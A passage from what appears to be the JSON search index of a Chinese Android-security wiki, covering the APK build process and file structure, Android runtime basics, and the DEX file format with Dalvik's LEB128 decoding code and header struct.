strings--->\u5b57\u7b26\u4e32\u8d44\u6e90 styles.xml\u2192\u6837\u5f0f\u8d44\u6e90 META-INF/ \u7c7b\u4f3c\u4e8e JAR \u6587\u4ef6\uff0cAPK \u6587\u4ef6\u4e2d\u4e5f\u5305\u542b\u4e86 META-INF \u76ee\u5f55\uff0c\u7528\u4e8e\u5b58\u653e\u4ee3\u7801\u7b7e\u540d\u7b49\u6587\u4ef6\uff0c\u4ee5\u4fbf\u4e8e\u7528\u6765\u786e\u4fdd APK \u6587\u4ef6\u4e0d\u4f1a\u88ab\u4eba\u968f\u610f\u4fee\u6539\u3002","title":"Android \u5f00\u53d1\u57fa\u7840"},{"location":"android/basic_develop/basic_develop/#android","text":"\u5728\u505a Android \u5b89\u5168\u4e4b\u524d\uff0c\u6211\u4eec\u5e94\u8be5\u5c3d\u53ef\u80fd\u5730\u4e86\u89e3 Android \u5f00\u53d1\u7684\u57fa\u672c\u6d41\u7a0b\u3002","title":"Android \u5f00\u53d1\u57fa\u7840"},{"location":"android/basic_develop/basic_develop/#_1","text":"\u4f9d\u6b21\u9605\u8bfb\u4ee5\u4e0b\u4e66\u7c4d\uff0c\u7531\u6d45\u5165\u6df1\u5730\u4e86\u89e3 Android \u57fa\u672c\u5f00\u53d1\u77e5\u8bc6 \u7b2c\u4e00\u884c\u4ee3\u7801\uff0c\u9605\u8bfb\u5b8c\u524d\u4e03\u7ae0\u5373\u53ef JNI/NDK \u5f00\u53d1\uff0c\u76ee\u524d\u5c1a\u672a\u627e\u5230\u4e00\u672c\u76f8\u5173\u5408\u9002\u7684\u6307\u5357\u3002 Android \u7f16\u7a0b\u6743\u5a01\u6307\u5357\uff08\u53ef\u9009\uff09 Android \u9ad8\u7ea7\u8fdb\u9636\uff08\u53ef\u9009\uff09 \u5728\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e2a\u4eba\u89c9\u5f97\u9700\u8981\u7740\u91cd\u4e86\u89e3 Android \u5f00\u53d1\u4e2d\u5982\u4e0b\u77e5\u8bc6 Android \u7cfb\u7edf\u67b6\u6784 \u57fa\u672c\u6e90\u6587\u4ef6\u67b6\u6784 \u57fa\u672c\u5f00\u53d1\u65b9\u5f0f\u4e0e\u4ee3\u7801\u7f16\u5199\u60ef\u4f8b\uff0c\u4e86\u89e3\u5e38\u89c1\u4ee3\u7801\u7684\u610f\u601d\u3002 \u4e86\u89e3 xml \u7b49\u4e00\u4e9b\u914d\u7f6e\u8d44\u6e90\u7684\u6587\u4ef6\u683c\u5f0f\u3002 \u4e00\u5b9a\u8981\u642d\u597d\u57fa\u672c\u7684 Android \u5f00\u53d1\u73af\u5883\uff01\uff01\uff01\uff01\uff01 java ddms ndk sdk\uff0c\u591a\u5b89\u88c5\u51e0\u4e2a\u7248\u672c\u7684 sdk\uff0c5.0-8.0","title":"\u57fa\u7840\u77e5\u8bc6"},{"location":"android/basic_develop/basic_develop/#apk","text":"\u5f53\u7f16\u5199\u5b8c App \u76f8\u5173\u7684\u4ee3\u7801\u540e\uff0c\u6211\u4eec\u7684\u6700\u540e\u4e00\u6b65\u5c31\u662f\u5c06 App \u4e2d\u6240\u6709\u4f7f\u7528\u5230\u7684\u8d44\u6e90\u6587\u4ef6\u8fdb\u884c\u6253\u5305\uff0c\u6253\u5305\u6d41\u7a0b\u5982\u4e0b\u56fe\uff08 http://androidsrc.net/android-app-build-overview/ \uff09\u6240\u793a\uff1a \u5177\u4f53\u7684\u64cd\u4f5c\u5982\u4e0b \u4f7f\u7528 aapt( The Android Asset Packing Tool ) \u5bf9\u8d44\u6e90\u6587\u4ef6\u8fdb\u884c\u6253\u5305\uff0c\u751f\u6210 R.java \u6587\u4ef6\u3002 \u5982\u679c\u9879\u76ee\u4e2d\u4f7f\u7528\u5230\u4e86 AIDL\uff08Android Interface Definition Language\uff09\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u5219\u9700\u8981\u4f7f\u7528 AIDL \u5de5\u5177\u89e3\u6790 AIDL \u63a5\u53e3\u6587\u4ef6\u751f\u6210\u76f8\u5e94\u7684 Java \u4ee3\u7801\u3002 \u4f7f\u7528 javac \u5c06 R.java \u548c AIDL \u6587\u4ef6\u7f16\u8bd1\u4e3a .class \u6587\u4ef6\u3002 \u4f7f\u7528 dx \u5de5\u5177\u5c06 class \u548c\u7b2c\u4e09\u65b9\u7684 library \u8f6c\u6362\u4e3a dex \u6587\u4ef6\u3002 \u5229\u7528 apkbuilder \u5c06\u7b2c\u4e00\u6b65\u7f16\u8bd1\u540e\u7684\u8d44\u6e90\u3001\u7b2c\u56db\u6b65\u751f\u6210\u7684 .dex \u6587\u4ef6\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5176\u5b83\u8d44\u6e90\u6253\u5305\u5230 APK \u6587\u4ef6\u4e2d\u3002 \u8fd9\u4e00\u90e8\u4e3b\u8981\u662f\u5bf9 APK \u8fdb\u884c\u7b7e\u540d\u3002\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5\uff0c\u5982\u679c\u6211\u4eec\u662f\u8981\u53d1\u5e03 App\uff0c\u90a3\u5c31\u91c7\u7528 RealeaseKeystore \u7b7e\u540d\uff1b\u53cd\u4e4b\uff0c\u6211\u4eec\u5982\u679c\u53ea\u662f\u60f3\u8981\u5bf9 App \u8fdb\u884c\u8c03\u8bd5\uff0c\u90a3\u5c31\u4f7f\u7528 debug.keystore \u7b7e\u540d\u3002 \u5728\u53d1\u5e03\u6b63\u5f0f\u7248\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5c06 APK \u5305\u4e2d\u8d44\u6e90\u6587\u4ef6\u8ddd\u79bb\u6587\u4ef6\u7684\u8d77\u59cb\u504f\u79fb\u4fee\u6539\u4e3a 4 \u5b57\u8282\u7684\u6574\u6570\u500d\u6570\uff0c\u8fd9\u6837\uff0c\u5728\u4e4b\u540e\u8fd0\u884c App \u7684\u65f6\u5019\uff0c\u901f\u5ea6\u4f1a\u6bd4\u8f83\u5feb\u3002","title":"Apk \u6253\u5305\u6d41\u7a0b"},{"location":"android/basic_develop/basic_develop/#apk_1","text":"APK \u6587\u4ef6\u4e5f\u662f\u4e00\u79cd ZIP \u6587\u4ef6\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u89e3\u538b zip \u7684\u5de5\u5177\u6765\u5bf9\u5176\u8fdb\u884c\u89e3\u538b\u3002\u4e00\u4e2a\u5178\u578b\u7684 APK \u6587\u4ef6\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\u3002\u5176\u4e2d\uff0c\u5173\u4e8e\u6bcf\u4e00\u90e8\u5206\u7684\u4ecb\u7ecd\u5982\u4e0b AndroidManifest.xml \u8be5\u6587\u4ef6\u4e3b\u8981\u7528\u4e8e\u58f0\u660e\u5e94\u7528\u7a0b\u5e8f\u7684\u540d\u79f0\uff0c\u7ec4\u4ef6\uff0c\u6743\u9650\u7b49\u57fa\u672c\u4fe1\u606f\u3002 class.dex \u8be5\u6587\u4ef6\u662f dalvik \u865a\u62df\u673a\u5bf9\u5e94\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5305\u542b\u5e94\u7528\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u4ee3\u7801\u3002 resource.arsc \u8be5\u6587\u4ef6\u4e3b\u8981\u662f\u5e94\u7528\u7a0b\u5e8f\u7f16\u8bd1\u540e\u7684\u4e8c\u8fdb\u5236\u8d44\u6e90\u4ee5\u53ca\u8d44\u6e90\u4f4d\u7f6e\u4e0e\u8d44\u6e90 id \u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u5982\u5b57\u7b26\u4e32\u3002 assets \u8be5\u6587\u4ef6\u5939\u4e00\u822c\u7528\u4e8e\u5305\u542b\u5e94\u7528\u7a0b\u5e8f\u7684\u539f\u59cb\u8d44\u6e90\u6587\u4ef6\uff0c\u4f8b\u5982\u5b57\u4f53\u548c\u97f3\u4e50\u6587\u4ef6\u3002\u7a0b\u5e8f\u5728\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u901a\u8fc7API \u83b7\u53d6\u8fd9\u4e9b\u4fe1\u606f\u3002 lib/ lib\u76ee\u5f55\u4e0b\u4e3b\u8981\u7528\u4e8e\u5b58\u50a8\u901a\u8fc7 JNI\uff08Java Native Interface\uff09\u673a\u5236\u4f7f\u7528\u7684\u672c\u5730\u5e93\u6587\u4ef6\uff0c\u5e76\u4e14\u4f1a\u6309\u7167\u5176\u652f\u6301\u7684\u67b6\u6784\uff0c\u5206\u522b\u521b\u5efa\u5bf9\u5e94\u7684\u5b50\u76ee\u5f55\u3002 res/ \u8be5\u76ee\u5f55\u4e3b\u8981\u5305\u542b\u4e86 Android \u5e94\u7528\u5f15\u7528\u7684\u8d44\u6e90\uff0c\u5e76\u4e14\u4f1a\u6309\u7167\u8d44\u6e90\u7c7b\u578b\u8fdb\u884c\u5b58\u50a8\uff0c\u5982\u56fe\u7247\uff0c\u52a8\u753b\uff0c\u83dc\u5355\u7b49\u3002\u4e3b\u8981\u8fd8\u6709\u4e00\u4e2a value \u6587\u4ef6\u5939\uff0c\u5305\u542b\u4e86\u5404\u7c7b\u5c5e\u6027\u8d44\u6e90 colors.xml\u2192\u989c\u8272\u8d44\u6e90 dimens.xml--->\u5c3a\u5bf8\u8d44\u6e90 strings--->\u5b57\u7b26\u4e32\u8d44\u6e90 styles.xml\u2192\u6837\u5f0f\u8d44\u6e90 META-INF/ \u7c7b\u4f3c\u4e8e JAR \u6587\u4ef6\uff0cAPK \u6587\u4ef6\u4e2d\u4e5f\u5305\u542b\u4e86 META-INF \u76ee\u5f55\uff0c\u7528\u4e8e\u5b58\u653e\u4ee3\u7801\u7b7e\u540d\u7b49\u6587\u4ef6\uff0c\u4ee5\u4fbf\u4e8e\u7528\u6765\u786e\u4fdd APK \u6587\u4ef6\u4e0d\u4f1a\u88ab\u4eba\u968f\u610f\u4fee\u6539\u3002","title":"Apk \u6587\u4ef6\u7ed3\u6784"},{"location":"android/basic_operating_mechanism/readme/","text":"Android \u5e94\u7528\u8fd0\u884c\u673a\u5236\u7b80\u8ff0 \u00b6 \u672c\u90e8\u5206\u4e3b\u8981\u5173\u6ce8 Android \u4e2d Java \u5c42\u4ee3\u7801\u4e0e Native \u5c42\u4ee3\u7801\u7684\u57fa\u672c\u8fd0\u884c\u539f\u7406\u3002 \u4e00\u822c\u800c\u8a00\uff0c\u5728\u542f\u52a8\u4e00\u4e2a App \u65f6\uff0cAndroid \u4f1a\u9996\u5148\u6267\u884c Application \u7c7b\uff08AndroidManifest.xml \u6587\u4ef6\u4e2d\u6ce8\u660e\uff09\u7684\u521b\u5efa\u5de5\u4f5c\uff0c\u7136\u540e\u518d\u5f00\u59cb\u6267\u884c Main Activity\uff0c\u7ee7\u800c\u6839\u636e\u5404\u79cd\u5404\u6837\u7684\u903b\u8f91\u6267\u884c\u76f8\u5173\u4ee3\u7801\u3002 \u6ce8\uff1a\u672c\u90e8\u5206\u7684\u5185\u5bb9\u53ef\u80fd\u5b58\u5728\u4ee5\u4e0b\u95ee\u9898 \u7b80\u7565 \u7406\u89e3\u4e0d\u5230\u4f4d \u5982\u679c\u53d1\u73b0\u53ef\u4ee5\u8865\u5145\u7684\u5730\u65b9\uff0c\u6b22\u8fce\u968f\u65f6\u53ca\u65f6\u8865\u5145\u3002\u5f53\u7136\uff0c\u672c\u90e8\u5206\u5185\u5bb9\u4e5f\u4f1a\u968f\u7740\u65f6\u95f4\u4e0d\u65ad\u66f4\u65b0\u3002","title":"\u7b80\u8ff0"},{"location":"android/basic_operating_mechanism/readme/#android","text":"\u672c\u90e8\u5206\u4e3b\u8981\u5173\u6ce8 Android \u4e2d Java \u5c42\u4ee3\u7801\u4e0e Native \u5c42\u4ee3\u7801\u7684\u57fa\u672c\u8fd0\u884c\u539f\u7406\u3002 \u4e00\u822c\u800c\u8a00\uff0c\u5728\u542f\u52a8\u4e00\u4e2a App \u65f6\uff0cAndroid \u4f1a\u9996\u5148\u6267\u884c Application \u7c7b\uff08AndroidManifest.xml \u6587\u4ef6\u4e2d\u6ce8\u660e\uff09\u7684\u521b\u5efa\u5de5\u4f5c\uff0c\u7136\u540e\u518d\u5f00\u59cb\u6267\u884c Main Activity\uff0c\u7ee7\u800c\u6839\u636e\u5404\u79cd\u5404\u6837\u7684\u903b\u8f91\u6267\u884c\u76f8\u5173\u4ee3\u7801\u3002 \u6ce8\uff1a\u672c\u90e8\u5206\u7684\u5185\u5bb9\u53ef\u80fd\u5b58\u5728\u4ee5\u4e0b\u95ee\u9898 \u7b80\u7565 \u7406\u89e3\u4e0d\u5230\u4f4d \u5982\u679c\u53d1\u73b0\u53ef\u4ee5\u8865\u5145\u7684\u5730\u65b9\uff0c\u6b22\u8fce\u968f\u65f6\u53ca\u65f6\u8865\u5145\u3002\u5f53\u7136\uff0c\u672c\u90e8\u5206\u5185\u5bb9\u4e5f\u4f1a\u968f\u7740\u65f6\u95f4\u4e0d\u65ad\u66f4\u65b0\u3002","title":"Android \u5e94\u7528\u8fd0\u884c\u673a\u5236\u7b80\u8ff0"},{"location":"android/basic_operating_mechanism/java_layer/readme/","text":"Android \u4e2d Java \u5c42\u7684\u8fd0\u884c\u673a\u5236 \u00b6 \u672c\u90e8\u5206\u4e3b\u8981\u5173\u6ce8 Android \u4e2d Java \u5c42\u4ee3\u7801\u7684\u8fd0\u884c\u673a\u5236\uff0c\u4e3b\u8981\u4ecb\u7ecd Java \u865a\u62df\u673a\uff0c\u4ece\u5b8f\u89c2\u89d2\u5ea6\u5373\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u6765\u8003\u8651 Java \u4ee3\u7801\u662f\u5982\u4f55\u88ab\u6267\u884c\u7684\u3002 Smali \u4ee3\u7801\uff0c\u4ece\u5fae\u89c2\u89d2\u5ea6\u5373\u6307\u4ee4\u7ea7\u522b\u8003\u8651 Java \u4ee3\u7801\u662f\u5982\u4f55\u5bf9\u5e94\u5230J Java \u865a\u62df\u673a\u4e2d\u7684\u6307\u4ee4\u3002 Java \u5c42\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8003\u8651 Java \u865a\u62df\u673a\u7684\u5bf9\u5e94\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5177\u4f53\u683c\u5f0f\u3002","title":"\u7b80\u8ff0"},{"location":"android/basic_operating_mechanism/java_layer/readme/#android-java","text":"\u672c\u90e8\u5206\u4e3b\u8981\u5173\u6ce8 Android \u4e2d Java \u5c42\u4ee3\u7801\u7684\u8fd0\u884c\u673a\u5236\uff0c\u4e3b\u8981\u4ecb\u7ecd Java \u865a\u62df\u673a\uff0c\u4ece\u5b8f\u89c2\u89d2\u5ea6\u5373\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u6765\u8003\u8651 Java \u4ee3\u7801\u662f\u5982\u4f55\u88ab\u6267\u884c\u7684\u3002 Smali \u4ee3\u7801\uff0c\u4ece\u5fae\u89c2\u89d2\u5ea6\u5373\u6307\u4ee4\u7ea7\u522b\u8003\u8651 Java \u4ee3\u7801\u662f\u5982\u4f55\u5bf9\u5e94\u5230J Java \u865a\u62df\u673a\u4e2d\u7684\u6307\u4ee4\u3002 Java \u5c42\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8003\u8651 Java \u865a\u62df\u673a\u7684\u5bf9\u5e94\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5177\u4f53\u683c\u5f0f\u3002","title":"Android \u4e2d Java \u5c42\u7684\u8fd0\u884c\u673a\u5236"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/","text":"DEX\u6587\u4ef6 \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 Google \u4e3a Android \u4e2d\u7684 Java \u4ee3\u7801\u4e13\u95e8\u8bbe\u8ba1\u4e86\u5bf9\u5e94\u7684\u53ef\u6267\u884c\u6587\u4ef6 DEX\uff08Dalvik eXecutable File\uff09\uff0c\u9002\u7528\u4e8e\u624b\u673a\u8fd9\u6837\u7684\u5185\u5b58\u4f4e\u548c\u5904\u7406\u5668\u6027\u80fd\u8f83\u5dee\u7684\u79fb\u52a8\u5e73\u53f0\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u5c31\u6765\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e0bDEX\u6587\u4ef6\u7684\u683c\u5f0f\u3002 DEX \u6587\u4ef6\u683c\u5f0f \u00b6 \u6570\u636e\u7c7b\u578b\u5b9a\u4e49 \u00b6 \u5728\u4ecb\u7ecd DEX \u6587\u4ef6\u7684\u5177\u4f53\u7ed3\u6784\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u6765\u5173\u6ce8\u4e00\u4e0b DEX \u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u4e00\u4e9b\u57fa\u7840\u7684\u6570\u636e\u7c7b\u578b\u3002 \u540d\u79f0 \u8bf4\u660e byte 8 \u4f4d\u6709\u7b26\u53f7\u6574\u6570 ubyte 8 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570 short 16 \u4f4d\u6709\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f ushort 16 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f int 32 \u4f4d\u6709\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f uint 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f long 64 \u4f4d\u6709\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f ulong 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u91c7\u7528\u5c0f\u7aef\u5b57\u8282\u5e8f sleb128 \u6709\u7b26\u53f7 LEB128\uff0c\u53ef\u53d8\u957f\u5ea6\uff08\u89c1\u4e0b\u6587\uff09 uleb128 \u65e0\u7b26\u53f7 LEB128\uff0c\u53ef\u53d8\u957f\u5ea6\uff08\u89c1\u4e0b\u6587\uff09 uleb128p1 \u65e0\u7b26\u53f7 LEB128 \u52a0 1 \uff0c\u53ef\u53d8\u957f\u5ea6\uff08\u89c1\u4e0b\u6587\uff09 \u5176\u4e2d\u4e4b\u6240\u4ee5\u4f1a\u91c7\u7528\u53d8\u957f\u7684\u6570\u636e\u7c7b\u578b\u662f\u56e0\u4e3a\u5e0c\u671b\u53ef\u4ee5\u5c3d\u53ef\u80fd\u51cf\u5c11\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5360\u7528\u7a7a\u95f4\uff0c\u6bd4\u5982\u8bf4\u5982\u679c\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u4e3a5\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ea\u9700\u8981\u4e00\u4e2a\u5b57\u8282\u5373\u53ef\uff0c\u4f46\u662f\u6211\u4eec\u53c8\u4e0d\u5e0c\u671b\u76f4\u63a5\u4f7f\u7528 u1 \u6765\u8fdb\u884c\u5b9a\u4e49\u76f8\u5e94\u7c7b\u578b\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u628a\u6240\u6709\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u90fd\u9650\u5236\u5728\u76f8\u5e94\u7684\u8303\u56f4\u5185\u3002 \u53ef\u53d8\u957f\u5ea6\u7684\u7c7b\u578b\u5176\u5b9e\u90fd\u662f\u57fa\u4e8e LEB128(Little-Endian Base) \u7c7b\u578b\u7684\uff0c\u53ef\u4ee5\u7528\u4e8e\u8868\u793a 32 \u4f4d\u5927\u5c0f\u7684 int \u6570\u5b57\uff0c\u5176\u6839\u636e\u6240\u8981\u8868\u793a\u7684\u6570\u5b57\u7684\u5927\u5c0f\u6765\u9009\u62e9\u5408\u9002\u7684\u957f\u5ea6\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5176\u4e2d\u6bcf\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u4f4d\u8868\u793a\u662f\u5426\u4f7f\u7528\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c1 \u8868\u793a\u4f7f\u7528\uff0c0 \u8868\u793a\u4e0d\u4f7f\u7528\u3002\u6545\u800c\u6bcf\u4e2a\u5b57\u8282\u5176\u5b9e\u53ea\u6709 7 \u4e2a\u6709\u6548\u7684 bit \u4f4d\u7528\u6765\u8868\u793a\u76f8\u5e94\u7684\u6570\u5b57\u3002\u5982\u679c\u6709\u4e00\u4e2a LEB128 \u7c7b\u578b\u7684\u53d8\u91cf\u4f7f\u7528\u4e86 5 \u4e2a\u5b57\u8282\uff0c\u5e76\u4e14\u7b2c\u4e94\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u4f4d\u4e3a 1 \uff0c\u90a3\u8bf4\u660e\u51fa\u73b0\u4e86\u95ee\u9898\u3002 dalvik\u4e2d\u8bfb\u53d6\u65e0\u7b26\u53f7leb128\u7c7b\u578b\u7684\u51fd\u6570\u5982\u4e0b DEX_INLINE int readUnsignedLeb128 ( const u1 ** pStream ) { const u1 * ptr = * pStream ; int result = * ( ptr ++ ); //\u53d6\u7b2c\u4e00\u4e2a\u5b57\u8282 if ( result > 0x7f ) { //\u5982\u679c\u7b2c1\u4e2a\u5b57\u8282\u5927\u4e8e0x7f,\u8868\u793a\u7b2c\u4e00\u4e2a\u5b57\u8282\u6700\u9ad8\u4f4d\u4e3a1 int cur = * ( ptr ++ ); //\u7b2c2\u4e2a\u5b57\u8282 result = ( result & 0x7f ) | (( cur & 0x7f ) << 7 ); //\u524d\u4e24\u4e2a\u5b57\u8282 if ( cur > 0x7f ) { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 14 ; if ( cur > 0x7f ) { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 21 ; if ( cur > 0x7f ) { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = * ( ptr ++ ); result |= cur << 28 ; } } } } * pStream = ptr ; return result ; } \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u6211\u4eec\u8981\u8ba1\u7b97c0 83 92 25\u7684uleb128\u503c\uff0c\u5982\u4e0b \u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u4f4d\u4e3a1\uff0c\u6240\u4ee5\u6709\u7b2c\u4e8c\u4e2a\u5b57\u8282\u3002result1 = 0xc0 & 0x7f=0x40 \u7c7b\u4f3c\u7684\uff0c\u7b2c\u4e8c\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684result2 = (0x83 & 0x7f)<<7 = 0x180 \u7b2c\u4e09\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684result3 = (0x92 & 0x7f) <<14 = 0x48000 \u7b2c\u56db\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684result4 = (0x25)<<21 = 0x4a00000 \u8be5\u5b57\u8282\u6d41\u5bf9\u5e94\u7684\u503c\u4e3aresult1+result2+result3+result4 = 0x4a481c0 dalvik\u4e2d\u8bfb\u53d6\u6709\u7b26\u53f7\u7684LEB128\u7c7b\u578b\u7684\u6570\u5b57\u5982\u4e0b DEX_INLINE int readSignedLeb128 ( const u1 ** pStream ) { const u1 * ptr = * pStream ; int result = * ( ptr ++ ); if ( result <= 0x7f ) { result = ( result << 25 ) >> 25 ; //\u7b26\u53f7\u6269\u5c55 } else { int cur = * ( ptr ++ ); result = ( result & 0x7f ) | (( cur & 0x7f ) << 7 ); if ( cur <= 0x7f ) { result = ( result << 18 ) >> 18 ; //\u7b26\u53f7\u6269\u5c55 } else { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 14 ; //\u7b26\u53f7\u6269\u5c55 if ( cur <= 0x7f ) { result = ( result << 11 ) >> 11 ; //\u7b26\u53f7\u6269\u5c55 } else { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 21 ; if ( cur <= 0x7f ) { result = ( result << 4 ) >> 4 ; //\u7b26\u53f7\u6269\u5c55 } else { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = * ( ptr ++ ); result |= cur << 28 ; } } } } * pStream = ptr ; return result ; } \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u5982\u6211\u4eec\u8981\u8ba1\u7b97d1 c2 b3 40\u7684sleb128\u503c\uff0c\u8ba1\u7b97\u8fc7\u7a0b\u5982\u4e0b result1 = 0xd1 & 0x7f = 0x51 result2 = (0xc2 & 0x7f) <<7 = 0x21000 result3 = (0xb3 & 0x7f) <<14 =0xcc000 result4 = (0x40)<< 21 = 0x8000000 \u6700\u540e\u7ed3\u679c(r1+r2+r3+r4)<< 4 >>4 = 0xf80ce151 uleb128p1\u7c7b\u578b\u4e3b\u8981\u662f\u7528\u8868\u793a\u65e0\u7b26\u53f7\u6570\uff0c\u5176\u9002\u7528\u4e8e\u4ee5\u4e0b\u573a\u666f \u8981\u6c42\u6570\u5b57\u7684\u8868\u793a\u5fc5\u987b\u975e\u8d1f \u5f53\u6570\u5b57\u4e3a0xffffffff\u65f6\uff0c\u5176\u52a0\u4e0a1\u5c31\u4e3a0\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53ea\u9700\u89811\u4e2a\u5b57\u8282\u5373\u53ef\u3002 \u6709\u5f85\u8fdb\u4e00\u6b65\u601d\u8003\u3002 DEX \u6587\u4ef6\u6982\u89c8 \u00b6 DEX\u6587\u4ef6\u7684\u6574\u4f53\u7ed3\u6784\u5982\u4e0b \u4e3b\u8981\u5305\u62ec\u4e09\u4e2a\u90e8\u5206 \u6587\u4ef6\u5934\uff0c\u7ed9\u51fadex\u6587\u4ef6\u7684\u57fa\u672c\u5c5e\u6027\u3002 \u7d22\u5f15\u533a\uff0c\u7ed9\u51fa\u76f8\u5173\u6570\u636e\u7684\u7d22\u5f15\uff0c\u5176\u6570\u636e\u5176\u5b9e\u653e\u5728\u6570\u636e\u533a\u3002 \u6570\u636e\u533a\uff0c\u5b58\u653e\u771f\u5b9e\u7684\u5b57\u7b26\u4e32\uff0c\u4ee3\u7801\u3002 DEX \u6587\u4ef6\u5934 \u00b6 DEX\u7684\u6587\u4ef6\u5934\u4e3b\u8981\u5305\u542bmagic\u5b57\u6bb5\u3001alder32\u6821\u9a8c\u503c\u3001SHA-1\u54c8\u5e0c\u503c\u3001string_ids\u7684\u4e2a\u6570\u4ee5\u53ca\u504f\u79fb\u5730\u5740\u7b49\uff0c\u56fa\u5b9a\u5360\u75280x70\u4e2a\u5b57\u8282\uff0c\u6570\u636e\u7ed3\u6784\u5982\u4e0b struct DexHeader { u1 magic [ 8 ]; /* includes version number */ u4 checksum ; /* adler32 checksum */ u1 signature [ kSHA1DigestLen ]; /* SHA-1 hash */ u4 fileSize ; /* length of entire file */ u4 headerSize ; /* offset to start of next section */ u4 endianTag ; u4 linkSize ; u4 linkOff ; u4 mapOff ; u4 stringIdsSize ; u4 stringIdsOff ; u4 typeIdsSize ; u4 typeIdsOff ; u4 protoIdsSize ; u4 protoIdsOff ; u4 fieldIdsSize ; u4 fieldIdsOff ; u4 methodIdsSize ; u4 methodIdsOff ; u4 classDefsSize ; u4 classDefsOff ; u4 dataSize ; u4 dataOff ; }; \u5176\u4e2d\u5177\u4f53\u7684\u63cf\u8ff0\u5982\u4e0b \u540d\u79f0 \u683c\u5f0f \u8bf4\u660e magic ubyte[8] = DEX_FILE_MAGIC \u6807\u8bc6DEX\u6587\u4ef6\uff0c\u5176\u4e2dDEX_FILE_MAGIC =\"dex\\n035\\0\" checksum uint \u9664 magic \u548c\u6b64\u5b57\u6bb5\u4e4b\u5916\u7684\u6587\u4ef6\u5269\u4e0b\u5185\u5bb9\u7684 adler32 \u6821\u9a8c\u548c\uff0c\u7528\u4e8e\u68c0\u6d4b\u6587\u4ef6\u635f\u574f\u60c5\u51b5 signature ubyte[20] \u9664 magic \u3001 checksum \u548c\u6b64\u5b57\u6bb5\u4e4b\u5916\u7684\u6587\u4ef6\u7684\u5185\u5bb9\u7684 SHA-1 \u7b7e\u540d\uff08\u54c8\u5e0c\uff09\uff0c\u7528\u4e8e\u5bf9\u6587\u4ef6\u8fdb\u884c\u552f\u4e00\u6807\u8bc6 file_size uint \u6574\u4e2a\u6587\u4ef6\uff08\u5305\u62ec\u6587\u4ef6\u5934\uff09\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d header_size uint = 0x70 \u6587\u4ef6\u5934\u7684\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002 endian_tag uint = ENDIAN_CONSTANT \u5b57\u8282\u5e8f\u6807\u8bb0\uff0c\u5927\u7aef\u5e8f\u6216\u8005\u5c0f\u7aef\u5e8f\u3002 link_size uint \u5982\u679c\u6b64\u6587\u4ef6\u672a\u8fdb\u884c\u9759\u6001\u94fe\u63a5\uff0c\u5219\u8be5\u503c\u4e3a 0 \uff0c\u53cd\u4e4b\u4e3a\u94fe\u63a5\u533a\u6bb5\u7684\u5927\u5c0f\uff0c link_off uint \u5982\u679c link_size == 0 \uff0c\u5219\u8be5\u503c\u4e3a 0 \uff1b \u53cd\u4e4b\uff0c\u8be5\u504f\u79fb\u91cf\u662f\u6587\u4ef6\u5f00\u5934\u5230\u5230 link_data \u533a\u6bb5\u7684\u504f\u79fb\u91cf\u3002 map_off uint 